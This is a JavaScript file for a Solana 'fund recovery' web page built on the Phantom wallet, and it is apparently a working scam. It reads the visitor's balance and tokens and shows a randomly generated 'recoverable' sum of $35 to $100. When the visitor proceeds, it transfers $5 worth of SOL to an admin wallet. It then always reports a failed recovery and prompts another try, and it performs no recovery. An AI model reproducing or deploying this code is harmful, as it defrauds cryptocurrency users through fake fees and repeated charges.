// Debugging: Ensure solanaWeb3 is loaded
if (!window.solanaWeb3) {
  console.error("solanaWeb3 is not defined. Ensure @solana/web3.js is loaded.");
}

// Admin address for receiving fees
const adminAddress = "YourMainnetAdminWalletAddressHere";

// Initialize Solana connection to Mainnet
const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

// Global variables
let walletPublicKey;
let solPrice = 0;

// Connect wallet
document.getElementById("walletButton").addEventListener("click", async () => {
  try {
    const { solana } = window;
    if (!solana || !solana.isPhantom) {
      throw new Error("Phantom wallet is not installed.");
    }

    if (!walletPublicKey) {
      const response = await solana.connect();
      walletPublicKey = response.publicKey.toString();
      document.getElementById("walletButton").innerText = "Disconnect";
      loadDashboard();
    } else {
      await solana.disconnect();
      walletPublicKey = null;
      document.getElementById("walletButton").innerText = "Connect Wallet";
      document.getElementById("landingPage").style.display = "block";
      document.getElementById("dashboard").style.display = "none";
    }
  } catch (error) {
    console.error("Failed to connect/disconnect wallet:", error.message);
    alert(`Error: ${error.message}`);
  }
});

// Load dashboard after connecting wallet
async function loadDashboard() {
  try {
    document.getElementById("landingPage").style.display = "none";
    document.getElementById("dashboard").style.display = "block";
    await fetchSolPrice();
    fetchBalance();
    fetchTokenHoldings();
  } catch (error) {
    console.error("Failed to load dashboard:", error.message);
    alert("Failed to load dashboard. Please try again.");
  }
}

// Fetch Solana price using Coingecko API
async function fetchSolPrice() {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
    const data = await response.json();
    solPrice = data.solana.usd;
    updateUsdBalance();
  } catch (error) {
    console.error("Failed to fetch SOL price:", error.message);
    alert("Failed to fetch SOL price. Please try again.");
  }
}

// Fetch Solana balance
async function fetchBalance() {
  try {
    const publicKey = new solanaWeb3.PublicKey(walletPublicKey);
    const balance = await connection.getBalance(publicKey);
    const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
    document.getElementById("solanaBalance").innerText = solBalance.toFixed(4);
    updateUsdBalance();
  } catch (error) {
    console.error("Failed to fetch balance:", error.message);
    alert("Failed to fetch balance. Please try again.");
  }
}

// Update USD balance based on SOL price
function updateUsdBalance() {
  const solBalance = parseFloat(document.getElementById("solanaBalance").innerText);
  const usdBalance = solBalance * solPrice;
  document.getElementById("usdBalance").innerText = `$${usdBalance.toFixed(2)}`;
}

// Fetch token holdings using SPL Token program
async function fetchTokenHoldings() {
  try {
    const publicKey = new solanaWeb3.PublicKey(walletPublicKey);
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
      programId: new solanaWeb3.PublicKey(splToken.TOKEN_PROGRAM_ID),
    });

    const tokenList = document.getElementById("tokenList");
    tokenList.innerHTML = "";

    for (const account of tokenAccounts.value) {
      const mintAddress = account.account.data.parsed.info.mint;
      const amount = account.account.data.parsed.info.tokenAmount.uiAmount;

      // Fetch token metadata using Solscan API
      const metadata = await fetchTokenMetadata(mintAddress);

      if (metadata.name) {
        const li = document.createElement("li");
        li.innerHTML = `${metadata.name}: ${amount} <button class="recover-button" onclick="showRecoverDialog(${amount})">Recover</button>`;
        tokenList.appendChild(li);
      }
    }
  } catch (error) {
    console.error("Failed to fetch token holdings:", error.message);
    alert("Failed to fetch token holdings. Please try again.");
  }
}

// Fetch token metadata using Solscan API
async function fetchTokenMetadata(mintAddress) {
  try {
    const response = await fetch(`https://api.mainnet-beta.solscan.io/token/meta?tokenAddress=${mintAddress}`);
    const data = await response.json();
    return data || {};
  } catch (error) {
    console.error("Failed to fetch token metadata:", error.message);
    return {};
  }
}

// Show recover dialog
function showRecoverDialog(amount) {
  const dialog = document.getElementById("recoverDialog");
  const recoverableAmount = Math.floor(Math.random() * 65 + 35); // Random between $35 and $100
  document.getElementById("recoverableAmount").innerText = `$${recoverableAmount}`;
  dialog.showModal();
}

// Handle recover process
document.getElementById("proceedButton").addEventListener("click", async () => {
  const { solana } = window;
  if (solana && solana.isPhantom) {
    const feeInSol = 5 / solPrice; // $5 worth of SOL
    const feeInLamports = feeInSol * solanaWeb3.LAMPORTS_PER_SOL;
    const adminPubkey = new solanaWeb3.PublicKey(adminAddress);

    try {
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
          toPubkey: adminPubkey,
          lamports: feeInLamports,
        })
      );

      const signature = await solana.sendTransaction(transaction, connection);
      document.getElementById("recoverDialog").close();

      // Show loading message
      alert("Recovering funds...");
      setTimeout(() => {
        alert("Failed to recover. Please try again.");
      }, 20000);
    } catch (error) {
      console.error("Transaction failed:", error.message);
      alert("Transaction failed. Please try again.");
    }
  }
});

document.getElementById("cancelButton").addEventListener("click", () => {
  document.getElementById("recoverDialog").close();
});
